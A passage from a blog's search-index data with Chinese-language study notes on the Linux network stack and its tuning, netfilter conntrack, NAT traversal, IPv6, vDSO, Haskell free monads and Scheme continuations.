id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e紀錄\u003c/p\u003e","title":"Array-Inversion-Count"},{"content":"動機 紀錄\nSol def solution(S): stk = [] for c in S: if stk and stk[-1] == c: stk.pop() else: stk.append(c) return \u0026#39;\u0026#39;.join(stk) ","permalink":"https://littlebees.github.io/2021/11/disappearing-pairs/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e紀錄\u003c/p\u003e","title":"Disappearing-Pairs"},{"content":"動機 算是packet在linux中走過的路的延伸\nin device init module_init =\u0026gt; 當設備驅動編譯時，MODULE_DEVICE_TABLE會導出一個 PCI 設備 ID 列表，驅動據此識別它可以控制的設備，內核也會依據這個列表對不同設備加載相應驅動。\n通過 PCI ID 識別設備後，內核就會為它選擇合適的驅動。 probe()\n啟用 PCI 設備 請求（requesting）內存範圍和 IO 端口 設置 DMA 掩碼 註冊設備驅動支持的 ethtool 方法（後面介紹） 註冊所需的 watchdog（例如，e1000e 有一個檢測設備是否freeze的 watchdog） 其他和具體設備相關的事情，例如一些 workaround，或者特定硬件的非常規處理 創建、初始化和註冊一個 struct net_device_ops 類型變量，這個變量包含了用於設 備相關的回調函數，例如打開設備、發送數據到網絡、設置 MAC 地址等 創建、初始化和註冊一個更高層的 struct net_device 類型變量（一個變量就代表了 一個設備） 驅動的硬中斷處理函數做的事情很少，但軟中斷將會在和硬中斷相同的 CPU 上執行。 這就是為什麼給每個 CPU 一個特定的硬中斷非常重要：這個 CPU 不僅處理這個硬中斷，而且通過 NAPI 處理接下來的軟中斷來收包。\n可以設定cpu affinity，讓localty上升，Set the IRQ affinity for IRQ 8 to CPU 0 echo 1 \u0026gt; /proc/irq/8/smp_affinity\ndevice bring up igb_open =\u0026gt;\n分配 RX、TX 隊列內存 有些網卡支援Receive Side Scaling（RSS，接收端擴展）或者多隊列（ multiqueue） 打開 NAPI 功能 (一次收多一點) 在一個單獨的線程裡，調用驅動註冊的 poll 方法收包 驅動禁止網卡產生新的硬件中斷。這樣做是為了 NAPI 能夠在收包的時候不會被新的中 斷打擾 一旦沒有包需要收了(或是收滿了,weight滿了)，NAPI 關閉，網卡的硬中斷重新開啟 註冊中斷處理函數 /proc/softirqs MSI-X 因為每個 RX 隊列有獨 立的MSI-X 中斷，因此可以被不同的 CPU 處理（通過 irqbalance 方式，或者修改 /proc/irq/IRQ_NUMBER/smp_affinity） MSI legacy IRQ 打開（enable）硬中斷 “Interrupt Throttling”（也叫 “Interrupt Coalescing”）的硬件 特性相關，這個特性可以平滑傳送到 CPU 的中斷數量 Interrupt coalescing 中斷合併會將多個中斷事件放到一起，累積到一定閾值後才向 CPU 發起中斷請求。 這可以防止中斷風暴，提升吞吐，降低 CPU 使用量，但延遲也變大；中斷數量過多則相反。 ethtool -C eth0 adaptive-rx on: 自適應 RX IRQ 合併 cat /proc/interrupts 網絡設備子系統的初始化 (net_dev_init) struct softnet_data 變量初始化 需要註冊到這個 CPU 的 NAPI 變量列表 數據處理 backlog 處理權重 receive offload 變量列表 receive packet steering 設置 註冊SoftIRQ NET_TX_SOFTIRQ =\u0026gt; net_tx_action NET_RX_SOFTIRQ =\u0026gt; net_rx_action monitor ethtool -S cat /sys/class/net/\u0026lt;NIC\u0026gt;/statistics/\u0026lt;item\u0026gt; /proc/net/dev 所有顯示的項目都是由driver定義的，所以不同driver同樣item的意思可能不同 tuning 調整queue RX queue的數量 RX queue的大小 RX queue的權重 RX queue的hash (讓pkt到不同的queue) ntuple filtering 在NIC上做過濾，steer到指定的queue inet開始收資料 先irq(igb_msix_ring)去要求跑sortirq，之後會帶到對應的softirq net_rx_action 從包所在的內存開始處理，包是被設備通過 DMA 直接送到內存。\nsoftirq透過NAPI(igb_poll)去讀，讀完就會解綁（unmap）這些內存，讀取數據，將數據送到napi_gro_receive，之後到下一層(tap或是ip，如果中間有RPS，會先過RPS)。\n有趣的是這裡的NAPI的weight寫死成64\nmonitor: /proc/net/softnet_stat 沒有title，這要直接看kernel code， net/core/net-procfs.c 每一行代表一個 struct softnet_data 變量。因為每個 CPU 只有一個該變量，所以每行 其實代表一個 CPU 每列用空格隔開，數值用 16 進製表示 第一列 sd-\u0026gt;processed，是處理的網絡幀的數量。如果你使用了 ethernet bonding， 那這個值會大於總的網絡幀的數量，因為 ethernet bonding 驅動有時會觸發網絡數據被 重新處理（re-processed） 第二列，sd-\u0026gt;dropped，是因為處理不過來而 drop 的網絡幀數量。後面會展開這一話題 第三列，sd-\u0026gt;time_squeeze，前面介紹過了，由於 budget 或 time limit 用完而退出 net_rx_action 循環的次數 接下來的 5 列全是 0 第九列，sd-\u0026gt;cpu_collision，是為了發送包而獲取鎖的時候有衝突的次數 第十列，sd-\u0026gt;received_rps，是這個 CPU 被其他 CPU 喚醒去收包的次數 最後一列，flow_limit_count，是達到 flow limit 的次數。 flow limit 是 RPS 的特性， 後面會稍微介紹一下 tune: 調整 net_rx_action budget * net.core.netdev_budget=600\nGRO（Generic Receive Offloading） Large Receive Offloading (LRO) 是一個硬件優化，GRO 是 LRO 的一種軟件實現。\n如果用 tcpdump 抓包，有時會看到機器收到了看起來不現實的、非常大的包， 這很可能是你的系統開啟了 GRO。\ntcpdump 的抓包點（捕獲包的 tap ）在整個棧的更後面一些，在GRO 之後。 NIC(與linux的level2)到IP之間\ndev_gro_receive 完成，napi_skb_finish 就會被調用，之後就是走 netif_receive_skb 或者繼續將包送到協議棧，或者交給 RPS，後者會轉交給其他 CPU 處理。\nRPS (Receive Packet Steering) RPS （Receive Packet Steering，接收包控制，接收包引導）是 RSS 的一種軟件實現\n因為它是軟件實現的，這意味著 RPS 只能在 packet 通過 DMA 進入內存後，RPS 才能開始工 作。\nRPS 並不會減少 CPU 處理硬件中斷和 NAPI poll（軟中斷最重要的一部分）的時 間，但是可以在 packet 到達內存後，將 packet 分到其他 CPU，從其他 CPU 進入協議棧。\nRPS 的工作原理是對個 packet 做 hash，以此決定分到哪個 CPU 處理。然後 packet 放到每個 CPU 獨占的接收後備隊列（backlog）等待處理。這個 CPU 會觸發一個進程間中斷（ IPI，Inter-processor Interrupt）向對端 CPU。如果當時對端 CPU 沒有在處理 backlog 隊列收包，這個進程間中斷會 觸發它開始從 backlog 收包。 /proc/net/softnet_stat 其中有一列是記錄 softnet_data 變量（也即這個 CPU）收到了多少 IPI（received_rps 列）。\ntune: /sys/class/net/DEVICE_NAME/queues/QUEUE/rps_cpus\nRFS (Receive Flow Steering) RFS 将属于相同 flow 的包送到相同的 CPU 进行处理，可以提高缓存命中率。\necho 2048 \u0026gt; /sys/class/net/eth0/queues/rx-0/rps_flow_cnt sysctl -w net.core.rps_sock_flow_entries=32768\naRFS (Hardware accelerated RFS) RFS 可以用硬件加速，網卡和內核協同工作，判斷哪個 flow 應該在哪個 CPU 上處理。 這個要開RFS與kernel要編CONFIG_RFS_ACCEL，ntuple也要開，最後配置 IRQ（硬中斷）中每個 RX 和 CPU 的對應關係\n到linux的level2 (协议栈) 從netif_receive_skb過來 先當成有RPS，pkt就會到cpu的backlog(enqueue_to_backlog)，之後NAPI的poller會去拉(process_backlog)，可以把cpu當成另一種網卡 另外有flow limit，避免cpu被打爆 最後做gro(napi_gro_complete)\n等到了cpu的backlog queue，NAPI poller就會去拉pkt backlog NAPI 變量和設備驅動 NAPI 變量的不同之處在於，它的 weight 是可以調節的，而設備 驅動是 hardcode 64。\nmonitor: 由於 input_pkt_queue 打滿或 flow limit 導致的丟包 * /proc/net/softnet_stat 裡面的 dropped tune: * RX packet timestamping * net.core.netdev_tstamp_prequeue=0 * 調cpu backlog: * net.core.netdev_max_backlog=3000 * 讓NAPI能一次拿更多pkt(wieght) * net.core.dev_weight=600 * 調flow limit的table size * net.core.flow_limit_table_len=8192 * 打開flow limit * /proc/sys/net/core/flow_limit_cpu_bitmap\n最後的最後，__netif_receive_skb_core把pkt送到抓包點（tap）或協議層\n到目前為止的流程 NIC -\u0026gt;(DMA,irq) driver -\u0026gt;(NAPI,sortirq) gro -\u0026gt; RPS -\u0026gt;(NAPI) tap/IP\n到IP ip_rcv之後就是netfilter(NF_HOOK)的prerouting，ip_rcv_finish(early_demux) 就可以往上走了!!\nearly_demux 如果這個優化打開了，但是並沒有命中緩存（例如，這是第一個包），這個包就會被送到內 核的路由子系統，在那裡將會計算出一個 dst_entry 並賦給相應的字段 所以應該能猜，沒開就是每次都去查?\ntune: 把early_demux關了(也許需要)\nnet.ipv4.ip_early_demux=0 如果是自己的pkt? ip_local_deliver處理，過netfilter，到ip_local_deliver_finish\nmonitor:\n/proc/net/snmp InReceives: ip_rcv收到多少pkt InHdrErrors: 多少ip header壞了 InAddrErrors: 多少pkt的addr是到不了的 ForwDatagrams: forwarded的ip pkt InUnknownProtos: 多少是protocol不明的 InDiscards: 多少pkt被丟了(也許是mem alloc失敗，也許是checksum error) InDelivers: 多少pkt成功往上送 InCsumErrors: 多少pkt是checksum error\n到udp udp_rcv\n這裡會看pkt與他的dst_entry(routing的結果)，送到socket的backlog tune:\nSocket receive queue memory net.core.rmem_max=8388608 net.core.rmem_default=8388608 或是用setsockopt帶 monitor: /proc/net/snmp /proc/net/udp /proc/net/snmp InDatagrams: 總共有多少udp pkt進入或流出 NoPorts: 總共有多少udp pkt的dport是沒有人在聽的 InErrors: 多少udp pkt有錯誤(也許是mem alloc失敗，也許是checksum error) OutDatagrams: 多少pkt成功往下送 RcvbufErrors: 有多少pkt是因為rcv buffer爆了而塞不進去 SndbufErrors: 有多少pkt是因為send buffer爆了而塞不進去 InCsumErrors: 多少pkt是checksum error\n/proc/net/udp sl: Kernel hash slot for the socket local_address: local addr rem_address: remote addr st: socket的狀態 tx_queue: tx queue的大小 rx_queue: rx queue的大小 tr, tm-\u0026gt;when, retrnsmt: 這些應該retry與retransmit uid: 創這個socket的uid timeout: 應該是tcp的timeout inode: socket的inode ref: reference count pointer: socket的address drops: 這個socket的drop\nsocket sock_queue_rcv收pkt，sk_data_ready通知socket\nout socket sentto，會走到sock_sendmsg，之後看socket是AF_INET，走道inet_sendmsg 之後就是走到udp_sendmsg\nudp 拿dip,dport，處理unicast或mutilcast，之後就是routing??，生skb(ip_make_skb)，丟給udp_send_skb\n怎麼感覺有偷跑的感覺在??\nip ip_send_skb收到pkt，ip_local_out，netfilter(local_out)，routing(拿dst_entry)，ip_output，netfilter(post_routing)，ip_finish_output\nip_finish_output，通常是\nip_fragment，之後ip_finish_output2 直接ip_finish_output2 ip_finish_output2會去調arp(鄰居系統)\nPath MTU Discovery 此功能允許內核自動確定 路由的最大傳輸單元（ MTU ）。\n調用 setsockopt 帶 SOL_IP 和 IP_MTU_DISCOVER\nlinux level2 (TC) dev_queue_xmit，之後就是找TX queue的旅程(netdev_pick_tx)，拿到TX queue找對應的qdisc，之後到dev_hard_start_xmit，會去跑qdisc，再到sch_direct_xmit-\u0026gt;dev_hard_start_xmit\n任何無法發送的 skb 都重新入隊，將在 NET_TX softirq 中進行 發送。 __netif_schedule發tx的irq\nsortirq: net_tx_action completion queue: 待釋放 skb 隊列 output queue: 待發送 skb 隊列 之後到dev_hard_start_xmit 發送數據花費的總時間是下面二者之和 系統調用的系統時間(sys time) NET_TX 類型的 softirq 時間（softirq time） dev_hard_start_xmit dev_queue_xmit_nit: copy skb到tap(pcap) ops-\u0026gt;ndo_start_xmit: 到device去 monitor: tc -s qdisc show dev eth1 bytes: driver總共傳了多少bytes pkt: driver總共傳了多少pkt dropped: qdisc drop多少pkt overlimits: 有多少pkt是因為這個qdisc的策略而被去掉的(queue爆了或是有pkt出queue時去清) requeues: 有多少pkt是重新入queue(像是driver丟不出去就會重新入queue) backlog: 現在queue多長\n你可以調整前面看到的__qdisc_run 循環的權重（上面看到的 quota 變量），這將導致 __netif_schedule 更多的被調用執行。結果將是當前 qdisc 將被更多的添加到當前 CPU 的 output_queue，最終會使發包所佔的時間變多。\ntune:\n調整__qdisc_run 處理權重 net.core.dev_weight=600 增加發送隊列長度 ifconfig eth0 txqueuelen 10000 Transmit Packet Steering (XPS) 發送數據包控制（XPS）是一項功能，允許系統管理員配置哪些 CPU 可以處理網卡的哪些發送 隊列。 XPS 的主要目的是避免處理髮送請求時的鎖競爭。使用 XPS 還可以減少緩存驅逐， 避免NUMA機器上的遠程 內存訪問等。\ntune: /sys/class/net/DEVICE_NAME/queues/QUEUE/xps_cpus\nNIC 到了driver的igb_xmit_frame_ring，再到igb_tx_map將 skb 數據映射到 RAM 的 DMA 區域\n完成傳送之後device送完pkt就會丟irq\n對於 igb 驅動程序（及其關聯設備），發送完成和數據包接收所觸發的 IRQ 是相同的。這意味著 對於 igb 驅動程序，NET_RX 既用於處理髮送完成，又用於處理數據包接收。 如果是這種情況，則 NET_RX softirq 會被用於 處理數據包接收和發送完成兩種情況。\n在NAPI做poll(igb_poll)時會去清已完成的pkt(igb_clean_tx_irq)\nDynamic Queue Limits (DQL) DQL 內部算法判斷何時數據已足夠多，達到此閾值後，DQL 將暫時禁用 TX Queue，從而對網絡系統產生背壓。當足夠的數據已發送完後，DQL 再自動重新啟用該隊列。\nmonitor: /sys/class/net/\u0026lt;NIC\u0026gt;/queues/tx-\u0026lt;QUEUE_ID\u0026gt;/byte_queue_limits/* hold_time: 類似tcp的timeout，如果queue一直滿到一定時間(以HZ為單位)就去縮小queue的最大長度 inflight: number of packets queued - number of packets completed limit_max: (寫死) DQL_MAX_LIMIT (1879048192 on my x86_64 system) limit_min: (寫死) 0 limit: 介於limit_min與limit_max之間，代表queue的最大長度\nRef [译] Linux 网络栈监控和调优：接收数据（2016） Illustrated Guide to Monitoring and Tuning the Linux Networking Stack: Receiving Data Monitoring and Tuning the Linux Networking Stack: Receiving Data [译] Linux 网络栈监控和调优：发送数据（2017） Monitoring and Tuning the Linux Networking Stack: Sending Data linux网络实现分析(1)——数据包的接收（从网卡到协议栈） linux网络实现分析(3)——数据包的发送（IP层到链路层） The packet flow, from userspace to kernel driver in Linux network stack\n","permalink":"https://littlebees.github.io/2021/11/packet%E5%9C%A8linux%E4%B8%AD%E8%B5%B0%E9%81%8E%E7%9A%84%E8%B7%AF2/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e算是\u003ca href=\"/2021/09/path-of-packet-in-linux/\"\u003epacket在linux中走過的路\u003c/a\u003e的延伸\u003c/p\u003e","title":"packet在linux中走過的路2"},{"content":"動機 把netfilter最後的拼圖補上\nnetfilter conntrack 有了hook可以看ip以上的所有pkt，那也可以用來track!!\n但不是track所有連線，只track有定義tuple的flow 所以conntrack只追trackable protocols\nTCP/UDP, DCCP, SCTP, GRE sip, dip, sport, dport, protocol ICMP ICMP type, ICMP code 會在下面的hook紀錄conntrack 為什麼要有unconfirm? netfilter可能會drop\nNAT 能track就能做nat!! 作用在prerouting, local_in, local_output, post_routing Masquerade? 一般: IP1變成IP2 Masquerade: IP1變成dev的IP\n新的track framework? 只要能做出hook就能做出conntrack，所以也可以bpf做出一樣的效果 Ref 连接跟踪（conntrack）：原理、应用及 Linux 内核实现\n","permalink":"https://littlebees.github.io/2021/11/netfilter%E7%9A%84conntrack/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e把netfilter最後的拼圖補上\u003c/p\u003e","title":"netfilter的conntrack"},{"content":"動機 興趣\nfree monad data Free f a where Pure :: a -\u0026gt; Free f a Impure :: f (Free f a) -\u0026gt; Free f a eta :: Functor f =\u0026gt; f a -\u0026gt; Free f a eta = Impure . fmap Pure 這裡的f要是functor，所以free有兩種case\n從一般數值生的Pure 把functor拔掉的Impure 另外有一個eta從functor生free\n兩個動作\n打包 把functor轉成free free只剩下拆DS的功能，真的有做事的都回到fmap去\n接著就能利用fmap，把applicative與monad做出來\ninstance Functor f =\u0026gt; Functor (Free f) where fmap f (Pure x) = Pure $ f x fmap f (Impure m) = Impure $ fmap (fmap f) m instance Functor f =\u0026gt; Applicative (Free f) where pure = Pure Pure f \u0026lt;*\u0026gt; m = fmap f m Impure f \u0026lt;*\u0026gt; m = Impure $ fmap (\u0026lt;*\u0026gt; m) f instance Functor f =\u0026gt; Monad (Free f) where return = Pure Pure a \u0026gt;\u0026gt;= k = k a Impure m \u0026gt;\u0026gt;= k = Impure (fmap (\u0026gt;\u0026gt;= k) m) freer monad fmap的type是(a -\u0026gt; b) -\u0026gt; f a -\u0026gt; f b\n如果有一個type直接把(a -\u0026gt; b)與f a先存好，是不是就直接是functor，同時利用free monad，就可以生出applicative與monad\n所以有了Lan(freer monad)\ndata Lan g a where Lan :: g x -\u0026gt; (x -\u0026gt; a) -\u0026gt; Lan g a instance Functor (Lan g) where fmap f (Lan gx h) = Lan gx (f . h) lan :: g a -\u0026gt; Lan g a lan ga = Lan ga id # return!! 吃 1. 被打包的值 2. 與轉type的函數 生freer(Lan) 這根本就是fmap\n把free monad生出來\ndata FFree g a where FPure :: a -\u0026gt; FFree g a FImpure :: g x -\u0026gt; (x -\u0026gt; FFree g a) -\u0026gt; FFree g a etaF :: g a -\u0026gt; FFree g a etaF fa = FImpure fa FPure 剩下的部分\ninstance Functor (FFree g) where fmap f (FPure x) = FPure (f x) fmap f (FImpure u q) = FImpure u (fmap f . q) instance Applicative (FFree g) where pure = FPure FPure f \u0026lt;*\u0026gt; x = fmap f x FImpure u q \u0026lt;*\u0026gt; x = FImpure u ((\u0026lt;*\u0026gt; x) . q) instance Monad (FFree g) where return = FPure FPure x \u0026gt;\u0026gt;= k = k x FImpure u k\u0026#39; \u0026gt;\u0026gt;= k = FImpure u (k\u0026#39; \u0026gt;\u0026gt;\u0026gt; k) 看lan的fmap的實作會發現，根本只有函數合成而已!!\n這裡可以注意Impure與FImpure Impure的目的是把被打包的值轉成Free 但FImpure本來就是吃被打包的值，那這裡怎麼模擬Impure? 把被打包的值的type換掉就好!!\nRef Free and Freer Monads: Putting Monads Back into Closet\n","permalink":"https://littlebees.github.io/2021/11/free-freer-monad/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e興趣\u003c/p\u003e","title":"free-freer-monad"},{"content":"動機 紀錄\n概念 總執行時間是由下面兩者組成\n可以被改善的 (可以平行化, P) 固定不變的 (只能序列執行, S) 所以就算把P最佳化，還是有極限在\n公式 P+S ---- S+P/(nums of cpu) 總執行時間除上\n只能序列執行的時間 加 可以平行化的總時間除上可以被分幾份(這裡用cpu數量去算) 出來的就是性能可以提升幾倍\nRef Amdahl\u0026rsquo;s Law\n","permalink":"https://littlebees.github.io/2021/11/amdahls-law/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e紀錄\u003c/p\u003e","title":"amdahl's law"},{"content":"動機 記錄用\nsyscall一般版 interrupt 0x80\nvsyscall 後面cpu有了專門打syscall的指令，但是32/64的指令居然不同!!\n32: sysenter, sysexit 64: syscall, sysret\n但如果在runtime每次判斷要用那種其實很智障 所以，加一層vsyscall，讓kernel在開機時根據cpu載入對的vsyscall的程式(binary) 並在kernel space留下一段固定位置給userspace獨與執行\n而這段位置怎麼讓userspace知道? ELF的auxiliary vector 的 AT_SYSINFO\nvdso(virtual dynamic shared object) vsyscall有兩個讓人怕的地方\nbinary，不好debug(symbol table在哪) 這是固定位置，怕 所以後面有了vDSO，把這段程式變成ELF，就可以動態載入與load DWARF ELF複製到page，透過auxiliary vector 的 AT_SYSINFO_EHDR給addr\n現在要用的話自然都是包在glibc __kernel_vsyscall _dl_vdso_vsym\n同時有了vsyscall與vDSO就可以加速syscall，因為不用轉到kernel space(提權)\nRef vDSO: 快速的 Linux 系統呼叫機制 https://alittleresearcher.blogspot.com/2017/04/linux-vdso-and-vsyscall-history.html The Definitive Guide to Linux System Calls\n","permalink":"https://littlebees.github.io/2021/11/syscall%E8%88%87vdso/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e記錄用\u003c/p\u003e","title":"syscall與vdso"},{"content":"動機 記錄用\nnat type 完全圓錐型NAT: in-ip \u0026lt;-\u0026gt; out-ip\u0026amp;port 受限圓錐型NAT: whitelist out-ip (dont care port) 埠受限圓錐型NAT: whitelist out-ip\u0026amp;port 對稱NAT: 每次的req的port都不一樣!! STUN 讓client知道\n在外部網路的位址(也就是Inside Global位址) 目前的NAT是使用怎樣的NAT種類 在不同範圍的ip有不同的名字 {inside local} )PC( {inside global} {outside local} )ISP( {outside global}\nTURN 只有STUN沒辦法與對面的nat中的server連線，所以讓STUN多了relay的功能\nudp打洞 mid server做筆記紀錄兩邊的out-ip\u0026amp;port 讓client查對方的out-ip\u0026amp;port client都先丟udp到server，第一次會被drop 但是本機的nat會記錄連線 換對面丟，因為有紀錄連線就會過 Ref 明辨STUN/TURN協定　輕鬆跨越NAT建立連線 简单解释 P2P 技术之 UDP 打洞\n","permalink":"https://littlebees.github.io/2021/11/nat%E7%A9%BF%E9%9A%A7%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e記錄用\u003c/p\u003e","title":"nat穿隧筆記"},{"content":"動機 記錄用\n128 bits 自己(Interface ID): 64 (後半) MAC(前半) + 0xFFFE + MAC(後半) 網路: 64 + 64 Global Unicast Address: 連到Internet的 Global Routing Prefix(48) + Subnet ID(16) + Interface ID(64) Global Routing Prefix: router或是ISP配發的prefix Link-Local Address: LAN的IP (on link) 0xFE80 + 0\u0026hellip;0(48) + Interface ID(64) Unique-Local Address: LAN的IP (on link) (1111 110) + Local bit(1) + global ID(40) + Subnet ID(16) + Interface ID(64) Local bit一般都是1 沒有broadcast，多了anycast Unicast: 就是一般的一對一 Multicast: 對在group內的host送訊息 Anycast: 送到最近的主機 自動組態 Neighbor Discovery Protocol，可以當成dhcp+arp 藉由ICMPv6完成，ICMPv6還是有ICMP的功能，但多了Neighbor Discovery\nNeighbor Discovery Protocol有下面的功能 Router Solicitation(RS): 問default gateway，會觸發RA Router Advertisement(RA): router回default gateway(與IPv6 Prefix) Neighbor Solicitation: 問mac或是level 2的資料 Neighbor Advertisement: reply of NS Redirect: router指示要往哪跳\n等等，dns勒 有三種作法\nRA(SLAAC, Stateless Address Auto-configuration)+RDNSS RA給default gateway與IPv6 Prefix RDNSS給dns RA+dhcpv6 RA給default gateway與IPv6 Prefix dhcpv6給dns 又名stateless dhcpv6，因為dhcp不會記有誰拿到IPv6 Prefix dhcpv6 RAS給default gateway dhcpv6給dns與IPv6 Prefix 又名stateful dhcpv6 可以看成RA就一定會有default gateway，剩下看dhcpv6要給什麼\n簡化的header 重要的放前面，不重要的放後面\n也是藉此達成ipv4的support，可以把ipv4 only的部分放到後面\n4 到 6 Dual Stack Routers: 一次跑兩個stack Tunneling: 用v4去包 NAT Protocol Translation: 用NAT轉\nRef IPv6位址配發技術介紹 Neighbor Discovery (ND) 簡介 IPv6 - Quick Guide\n","permalink":"https://littlebees.github.io/2021/11/ipv6%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e記錄用\u003c/p\u003e","title":"ipv6筆記"},{"content":"動機 整理continuation與CPS轉換\n用法 cont可以當成一種很強的return或是goto，但是可以當成函數用\n(let ((val (callcc (lambda (k) (k k))))) (set! cont k) (display k)) (cont 10) (cont 20) 只要調用cont就會回去當初執行callcc的那一行，所以可以用它來跳來跳去\n應用 dynamic-wind 類似prehook與posthook，只是有在裡面執行或是要到裡面，就一定會跑prehook與posthook\n下面是其中一種實作，stack放(prehook . afterhook)，之後就是對callcc動手腳，只要有人call就去跑整個stack\n(define *here* (list #f)) (define origin-callcc call-with-current-continuation) (define (call-with-current-continuation proc) (let ((here *here*)) (origin-callcc (lambda (cont) (proc (lambda results (reroot! here) ;; 包一層 (apply cont results))))))) (define (dynamic-wind before during after) (let ((here *here*)) (reroot! (cons (cons before after) here)) (call-with-values during (lambda results (reroot! here) (apply values results))))) (define (reroot! there) (if (not (eq? *here* there)) (begin (reroot! (cdr there)) (let ((before (caar there)) (after (cdar there))) (set-car! *here* (cons after before)) ;; reverse before after, so next time after will be invoke!! (set-cdr! *here* there) (set-car! there #f) (set-cdr! there \u0026#39;()) (set! *here* there) (before))))) exception 一個stack放fail時要跳回去那邊的cont\ndynamic-wind是確保，cont被call時一定會pop stack 從cont進去時會把stack建回去 (在exception不需要就是了)\n(define-syntax try (syntax-rules (catch) ((_ exp ... catch proc) ; =\u0026gt; (let ((cc (current-continuation))) (cond ((procedure? cc) (dynamic-wind (lambda () (set! exception-stack (cons cc exception-stack))) (lambda () exp ...) (lambda () (set! exception-stack (cdr exception-stack))))) ((pair? cc) (proc (cadr cc)))))))) (define (throw exception-value) (let ((handler (car exception-stack))) (handler (list \u0026#39;exception exception-value)))) (try (try (throw \u0026#39;foo) catch (lambda (exn) (display \u0026#34;got inner exception: \u0026#34;) (display exn) (newline) (throw \u0026#39;bar))) catch (lambda (exn) (display \u0026#34;got outer exception: \u0026#34;) (display exn) (newline))) non-determing computing 一個stack放fail時要跳回去那邊的cont\n(define (current-continuation) (call-with-current-continuation (lambda (cc) (cc cc)))) ; fail-stack : list[continuation] (define fail-stack \u0026#39;()) ; fail : -\u0026gt; ... (define (fail) (if (not (pair? fail-stack)) (error \u0026#34;back-tracking stack exhausted!\u0026#34;) (begin (let ((back-track-point (car fail-stack))) (set! fail-stack (cdr fail-stack)) (back-track-point back-track-point))))) ; amb : list[a] -\u0026gt; a (define (amb choices) (let ((cc (current-continuation))) (cond ((null? choices) (fail)) ((pair? choices) (let ((choice (car choices))) (set! choices (cdr choices)) (set! fail-stack (cons cc fail-stack)) choice))))) (define (assert condition) (or condition (fail))) ; The following prints (4 3 5) (let ((a (amb (list 1 2 3 4 5 6 7))) (b (amb (list 1 2 3 4 5 6 7))) (c (amb (list 1 2 3 4 5 6 7)))) (assert (= (* c c) (+ (* a a) (* b b))))) generator 一個ptr指向目前generator停下來的位置，另外為了讓generator好看，所以把生generator的cont交給make-yield\n所以每次yield就會把val與cont丟回去\n(define (current-continuation) (call-with-current-continuation (lambda (cc) (cc cc)))) ; void : -\u0026gt; void (define (void) (if #f #t)) ; tree-iterator : tree -\u0026gt; generator (define (tree-iterator tree) (lambda (yield) (define (walk tree) (if (not (pair? tree)) (yield tree) (begin (walk (car tree)) (walk (cdr tree))))) (walk tree))) ; make-yield : continuation -\u0026gt; (value -\u0026gt; ...) (define (make-yield for-cc) (lambda (value) (let ((cc (current-continuation))) (if (procedure? cc) (for-cc (cons cc value)) (void))))) ; (for v in generator body) will execute body ; with v bound to successive values supplied ; by generator. (define-syntax for (syntax-rules (in) ((_ v in iterator body ...) ; =\u0026gt; (let ((iterator-cont #f)) (letrec ((loop (lambda () (let ((cc (current-continuation))) (if (procedure? cc) (if iterator-cont (iterator-cont (void)) (iterator (make-yield cc))) (let ((it-cont (car cc)) (it-val (cdr cc))) (set! iterator-cont it-cont) (let ((v it-val)) body ...) (loop))))))) (loop)))))) (for v in (tree-iterator \u0026#39;(3 . ( ( 4 . 5 ) . 6 ) )) (display v) (newline)) thread 前面是把cont塞到stack，這裡放到queue去!!\n; thread-queue : list[continuation] (define thread-queue \u0026#39;()) ; halt : continuation (define halt #f) ; void : -\u0026gt; void (define (void) (if #f #t)) ; current-continuation : -\u0026gt; continuation (define (current-continuation) (call-with-current-continuation (lambda (cc) (cc cc)))) ; spawn : (-\u0026gt; anything) -\u0026gt; void (define (spawn thunk) (let ((cc (current-continuation))) (if (procedure? cc) (set! thread-queue (append thread-queue (list cc))) (begin (thunk) (quit))))) ; yield : value -\u0026gt; void (define (yield) (let ((cc (current-continuation))) (if (and (procedure? cc) (pair? thread-queue)) (let ((next-thread (car thread-queue))) (set! thread-queue (append (cdr thread-queue) (list cc))) (next-thread \u0026#39;resume)) (void)))) ; quit : -\u0026gt; ... (define (quit) (if (pair? thread-queue) (let ((next-thread (car thread-queue))) (set! thread-queue (cdr thread-queue)) (next-thread \u0026#39;resume)) (halt))) ; start-threads : -\u0026gt; ... (define (start-threads) (let ((cc (current-continuation))) (if cc (begin (set! halt (lambda () (cc #f))) (if (null? thread-queue) (void) (begin (let ((next-thread (car thread-queue))) (set! thread-queue (cdr thread-queue)) (next-thread \u0026#39;resume))))) (void)))) ;; Example cooperatively threaded program (define counter 10) (define (make-thread-thunk name) (letrec ((loop (lambda () (if (\u0026lt; counter 0) (quit)) (display \u0026#34;in thread \u0026#34;) (display name) (display \u0026#34;; counter = \u0026#34;) (display counter) (newline) (set! counter (- counter 1)) (yield) (loop)))) loop)) (spawn (make-thread-thunk \u0026#39;a)) (spawn (make-thread-thunk \u0026#39;b)) (spawn (make-thread-thunk \u0026#39;c)) (start-threads) cont monad monad就是消滅傳遞參數的過程，下面來複習cont monad\n先基本的cps\n(define (id x) x) (define (fib1 n k) (if (\u0026lt;= n 1) (k 1) (fib1 (- n 1) (lambda (v1) (fib1 (- n 2) (lambda (v2) (k (+ v1 v2)))))))) (writeln (fib1 5 id)) 把k往裡面推\n(define (fib2 n) (if (\u0026lt;= n 1) (lambda (k) (k 1)) (lambda (k) ((fib2 (- n 1)) (lambda (v1) ((fib2 (- n 2)) (lambda (v2) (k (+ v1 v2))))))))) (writeln ((fib2 5) id)) 包一包，這裡可以注意到其實monad指的就是(lambda (k) ...)，只要被這個包起來就是monad!!\n(define (return val) (lambda (k) (k val))) (define (bind m f) (lambda (k) ((m f) k))) (define (fib3 n) (if (\u0026lt;= n 1) (return 1) (bind (fib3 (- n 1)) (lambda (v1) (bind (fib3 (- n 2)) (lambda (v2) (return (+ v1 v2)))))))) (writeln ((fib3 5) id)) callcc就是\n擷取現在的cont，塞進去lambda 讓原本的程式用原本的cont繼續跑 (define (callcc f) (lambda 